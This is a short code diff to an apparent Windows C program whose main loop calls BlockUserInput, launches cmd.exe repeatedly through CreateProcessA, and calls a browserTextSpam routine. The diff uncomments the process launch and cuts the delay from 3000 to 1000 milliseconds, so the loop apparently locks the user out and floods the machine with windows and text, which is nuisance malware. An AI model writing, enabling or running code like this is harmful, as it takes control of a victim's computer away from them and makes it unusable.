@@ -114,11 +114,11 @@ int main(){
         BlockUserInput();
         STARTUPINFOA si = {sizeof(STARTUPINFO)};
         PROCESS_INFORMATION pi;
-        //CreateProcessA( "C:\\Windows\\System32\\cmd.exe",
+        CreateProcessA( "C:\\Windows\\System32\\cmd.exe",
                     NULL, 
                     NULL, NULL, 0, 0, NULL, NULL, &si, &pi);
         browserTextSpam();
-        Sleep(3000);
+        Sleep(1000);
     }
     return 0;
 }
